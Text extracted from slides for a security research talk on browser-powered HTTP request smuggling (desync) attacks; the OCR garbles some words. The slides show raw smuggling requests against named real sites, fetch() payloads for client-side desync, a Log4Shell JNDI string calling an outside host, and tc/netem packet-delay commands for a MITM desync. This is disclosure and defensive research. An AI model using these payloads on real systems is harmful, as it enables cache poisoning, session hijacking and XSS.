Browser-Powered Desync Attacks
James Ke(le
A New Frontier in HTTP Request Smuggling
Warning / disclaimer
These slides are intended to supplement the presenta1on. 
They are not suitable for stand-alone consump1on. 
You can ﬁnd the whitepaper and presenta1on recording here:
h=ps://portswigger.net/research/browser-powered-desync-a=acks
If it’s not uploaded yet, you can get no1ﬁed when it’s ready by 
following me at h"ps://twi"er.com/albinowax
- albinowax
A problem and a discovery
2019 
Problem: Request Smuggling false positives
Solution: Never reuse HTTP/1.1 connections
2021
Problem: Connection-locked request smuggling
Solution: Always reuse HTTP/1.1 connections
X X
CVE-2020-12440 
replica lab on portswigger.net/academy
portswigger/{http-request-smuggler,turbo-intruder}
Full PoC exploit code available in whitepaper
• HTTP handling anomalies
• Client-side desync
• Pause-based desync
• Defence & Takeaways
• Q&A
Outline
HTTP handling anomalies
The request is a lie
Connection state attacks: first-request validation
GET / HTTP/1.1
Host: www.example.com
GET / HTTP/1.1
Host: intranet.example.com
GET / HTTP/1.1
Host: www.example.com
GET / HTTP/1.1
Host: intranet.example.com
HTTP/1.1 200 OK
-connection reset-
HTTP/1.1 200 OK
HTTP/1.1 200 OK
Internal website
Connection state attacks: first-request routing
POST /pwreset HTTP/1.1
Host: example.com
POST /pwreset HTTP/1.1
Host: psres.net
POST /pwreset HTTP/1.1
Host: example.com
POST /pwreset HTTP/1.1
Host: psres.net
HTTP/1.1 302 Found
Location: /login
HTTP/1.1 421 Misdirected
HTTP/1.1 302 Found
Location: /login
HTTP/1.1 302 Found
Location: /login
✉ Reset your password: https://psres.net/reset?k=secret
Sometimes: 200 OK 
Sometimes: 400 Bad Request
X
The surprise factor
POST / HTTP/1.1
Transfer-Encoding: chunked
0
malicious-prefix
:method POST
:path /
For request smuggling, all you need is a server taken by surprise
ALB
2021-07-28: Reported
2021-08-05: Fixed
0
malicious-prefix
HTTP/1.1 404 Not Found
Content-Length: 162…
GET / HTTP/1.1
Host: example.com
Detecting regular CL.TE
POST / HTTP/1.1
Content-Length: 41
Transfer-Encoding: chunked
0
GET /hopefully404 HTTP/1.1
Foo: bar
HTTP/1.1 301 Moved Permanently
Location: /en
READ
READ
Detecting connection-locked CL.TE
POST / HTTP/1.1
Content-Length: 41
Transfer-Encoding: chunked
0
GET /hopefully404 HTTP/1.1
Foo: bar
HTTP/1.1 301 Moved Permanently
Location: /en
HTTP/1.1 404 Not Found
Content-Length: 162…
READ
READ
Is the front-end using the Content-Length? Can't tell
GET / HTTP/1.1
Host: example.com
DetecDng connecDon-locked CL.TE
POST / HTTP/1.1
Content-Length: 41
Transfer-Encoding: chunked
0
HTTP/1.1 301 Moved Permanently
Location: /en
EARLY
READ
Is the front-end using the Content-Length? No
DetecDng connecDon-locked CL.TE
POST / HTTP/1.1
Content-Length: 41
Transfer-Encoding: chunked
0
GET /hopefully404 HTTP/1.1
Foo: bar
HTTP/1.1 301 Moved Permanently
Location: /en
HTTP/1.1 404 Not Found
Content-Length: 162…
EARLY
READ
READ
⌛ 
READ
GET / HTTP/1.1
Host: example.com
Finding: Barracuda ADC in front of IIS. Patched in 6.5.0.007
Is the front-end using the Content-Length? Yes
CL.0 browser-compatible desync
POST / HTTP/1.1
Host: redacted
Content-Length: 3
xyz
HTTP/1.1 200 OK
HTTP/1.1 405 Method Not Allowed
GET / HTTP/1.1
Host: redacted
Taxonomy
TE.CL and CL.TE     // classic request smuggling
H2.CL and H2.TE    // HTTP/2 downgrade smuggling
CL.0 
// this
H2.0                        // implied by CL.0
0.CL and 0.TE         // unexploitable without pipelining
H2.0 on amazon.com
POST /b/? HTTP/2
Host: www.amazon.com
Content-Length: 31
GET /favicon.ico HTTP/1.1
X: X
HTTP/2 200 OK
Content-Type: text/html
HTTP/2 200 OK
Content-Type: image/x-icon
POST /gp/customer-reviews/aj/private/ 
reviewsGallery/get-image-gallery HTTP/1.1 
X-Amz-SideCar-Enabled: on
X-Amz-Sidecar-Destination-Host: 
http://us-other-iad7.amazon.com:1080
X-Forwarded-Host: …
GET / HTTP/1.1
Host: www.amazon.com
2021-10-26: Reported
 {
location = 'https://example.com/'
})
Matching connecBon IDs
Poisoned status
- Disable proxy, open cross-domain HTTPS aVacker site
- Open DevTools Network tab, enable Preserve Log & ConnecXon ID
Store
Chain & Pivot
• User-Agent: ${jndi:ldap://x.oastify.com}
• Impossible CSRF
Attack
• Host-header redirects
• HEAD-splicing XSS
• Challenges: precision, stacked-responses
Explore exploitation routes
Akamai - detection
POST /assets HTTP/1.1
Host: www.capitalone.ca
Content-Length: 30
GET /robots.txt HTTP/1.1
X: Y
HTTP/1.1 301 Moved Permanently
Location: /assets/
HTTP/1.1 200 OK
Allow: /
fetch('https://www.capitalone.ca/assets', {method: 'POST', 
body: "GET /robots.txt HTTP/1.1\r\nX: Y", mode: 'no-cors', 
credentials: 'include'})
Name
Status
Connection ID
/assets
301
1135468
/assets/
200
1135468
GET /assets/ HTTP/1.1
Host: www.capitalone.ca
Allow: /
Akamai – Stacked HEAD 
POST /assets HTTP/1.1
Host: www.capitalone.ca
Content-Length: 67
HEAD /404/?cb=123 HTTP/1.1
GET /x?evil() HTTP/1.1
X: Y
HTTP/1.1 301 Moved Permanently
Location: /assets/
HTTP/1.1 404 Not Found  
Content-Type: text/html
Content-Length: 432837
HTTP/1.1 301 Moved Permanently
Location: /x/?evil()
OVER
READ
READ
READ
GET / HTTP/1.1
Host: www.capitalone.ca
fetch('https://www.capitalone.ca/assets', { 
method: 'POST', 
// use a cache-buster to delay the response
body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\n
Host: www.capitalone.ca\r\n
\r\n
GET /x?x= HTTP/1.1\r\n
X: Y`, 
credentials: 'include', 
mode: 'cors' // throw an error instead of following redirect
}).catch(() => { 
location = 'https://www.capitalone.ca/'
})
Akamai – Stacked HEAD
2021-11-03: Reported 
 https://redacted.com/+CSCOE+/logon.html
=> 301 Moved Permanently (from cache)
=> https://psres.net/+webvpn+/index
=> malicious()
https://psres.net/launchAttack.html:
Browser cache entry for /win.js is now poisoned
GET /+CSCOE+/win.js HTTP/1.1
Host: redacted.com
2021-11-10: Reported 
2022-03-02: wontfix'd
CVE-2022-20713
Verisign – fragmented chunk
POST /%2f HTTP/1.1
Host: www.verisign.com
Content-Length: 81
HEAD / HTTP/1.1
Connection: keep-alive
Transfer-Encoding: chunked
34d
POST / HTTP/1.1
Host: www.verisign.com
Content-Length: 59
0
GET /evil() HTTP/1.1
Host: www.verisign.com
HTTP/1.1 200 OK
HTTP/1.1 200 OK
Content-Length: 54873
Content-Type: text/html
HTTP/1.1 301 Moved Permanently
Location: /en_US/evil()/index.xhtml
2021-12-22: Reported 
2022-07-21: Fixed
Pulse Secure VPN – an approach of last resort
Regular CSD attacks:
1. Create a poisoned connection
2. Trigger navigation
Hijacking JS with a non-cacheable redirect:
1. Navigate to target page
2. Guess when the page has loaded
3. Create some poisoned connections
4. Hope a JS import uses a poisoned connection
Making it plausible:
• Pre-connect to normalise target page load time
• Combine with window for multiple attempts
• Identify page with non-cacheable JS import
Pause-based desync
Pause-based desync
POST /admin HTTP/1.1
Content-Length: 41
GET /404 HTTP/1.1
Foo: bar
HTTP/1.1 403 Forbidden
HTTP/1.1 404 Not Found
⌛ 10s
⌛ wait for response
if (req.url ~ "^/admin") {
return (synth(403, "Forbidden"));
}
Redirect 301 /redirect /destination
GET / HTTP/1.1
Host: example.com
Server-side pause-based desync
POST /admin HTTP/1.1
Content-Length: 23
GET /404 HTTP/1.1
X: Y
HTTP/1.1 403 Forbidden
HTTP/1.1 404 Not Found
⌛ 10s
Front-end
⌛ 20s
Varnish/Apache
Requirement: Front-end forwards request headers without waiting for body
Turbo Intruder queue() arguments:
pauseTime=20000, pauseBefore=-41,  pauseMarker=['GET']
GET / HTTP/1.1
Host: example.com
-reset-
Pause-based desync with ALB
POST /admin HTTP/1.1
Content-Length: 23
GET /404 HTTP/1.1
X: Y
HTTP/1.1 403 Forbidden
⌛ 10s
⌛ 20s
POST /admin HTTP/1.1
Content-Length: 23
GET /404 HTTP/1.1
X: Y
GET / HTTP/1.1
Host: example.com
HTTP/1.1 403 Forbidden
HTTP/1.1 404 Not Found
⌛ 10s
⌛ 10s
Pause-based desync with matching timeouts
POST /admin HTTP/1.1
Content-Length: 23
GET /404 HTTP/1.1
X: Y
GET / HTTP/1.1
Host: example.com
HTTP/1.1 403 Forbidden
HTTP/1.1 404 Not Found
⌛ 60s
⌛ 60s
⌛ 60s
Zero-padding chunk size
Stripped chunk extensions
TCP duplicate packet
TCP out-of-order packet
66-hour attack
Client-side pause-based desync via MITM
POST /admin HTTP/1.1
Content-Length: 28
GET /404 HTTP/1.1
X: PADPAD
HTTP/1.1 403 Forbidden
HTTP/1.1 404 Not Found
⌛ 60s
⌛ 61s
The theory:
• Attacker website sends request, padded to cause TCP fragmentation
• MITM identifies the TCP packet containing the request body via the size
• MITM delays this packet, causing a server timeout & pause-based desync
• The delayed packet is then interpreted as a new message
MITM
🔒
GET / HTTP/1.1
Host: example.com
MITM-based desync using Traffic control
# Setup
tc qdisc add dev eth0 root handle 1: prio priomap
# Flag packets to 34.255.5.242 if between 700 and 1300 bytes
tc filter add dev eth0 protocol ip parent 1:0 prio 1 basic \
match 'u32(u32 0x22ff05f2 0xffffffff at 16)' \
and 'cmp(u16 at 2 layer network gt 0x02bc)' \
and 'cmp(u16 at 2 layer network lt 0x0514)' \
flowid 1:3
# Delay flagged packets by 61 seconds
tc qdisc add dev eth0 parent 1:3 handle 10: netem delay 61s
Demo: Breaking HTTPS on Apache
Varnish CVE-2022-23959
2021-12-17: Reported
2022-01-25: Patched in 7.0.2/6.6.2
Apache CVE-2022-22720
2021-12-17: Reported
2022-03-14: Patched in 2.4.53
• Use HTTP/2 end to end
• Don’t downgrade/rewrite HTTP/2 requests to HTTP/1
• Don't roll your own HTTP server, but if you do:
• Never assume there's no Content-Length
• Default to discarding the socket
• Don't attach state to a connection
Defence
References & further reading
Whitepaper, slides & academy topic
https://portswigger.net/research/browser-powered-desync-attacks
https://portswigger.net/web-security/request-smuggling/browser
Source code @ github
PortSwigger/http-request-smuggler
PortSwigger/turbo-intruder
References & further reading:
HTTP Desync Attacks: https://portswigger.net/research/http-desync-attacks
HTTP/2 Desync Attacks: https://portswigger.net/research/http2
HTTP Request Smuggling: https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf
HTTP Request Smuggling in 2020 - https://www.youtube.com/watch?v=Zm-myHU8-RQ
Response Smuggling - https://www.youtube.com/watch?v=suxDcYViwao
Client-side desync
Pause-based desync
ConnecXon-state probe
CL.0 desync
Connection-state SSRF
CL.0 desync
CSD request capture
CSD cache poisoning
Pause-based CL.0 
Practice labs
Scan
Internal Server Error
Exploiting Inter-Process Communication in SAP's HTTP Server
Airing today at 1330 by Martin Doyhenard
You might also like:
The request is a lie
No front-end is no escape
All you need is a server taken by surprise
@albinowax
Email: PI:EMAIL
Takeaways